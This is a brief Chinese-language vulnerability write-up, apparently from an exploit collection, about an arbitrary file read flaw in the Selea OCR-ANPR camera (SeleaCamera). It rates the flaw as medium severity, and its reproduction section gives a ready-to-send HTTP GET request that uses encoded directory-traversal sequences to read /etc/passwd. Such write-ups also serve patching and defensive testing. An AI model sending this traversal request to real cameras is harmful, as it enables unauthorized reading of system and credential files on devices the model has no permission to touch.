# Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞

## 漏洞描述
Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202140932431.png)

发送如下请求包读取文件

```plain
GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
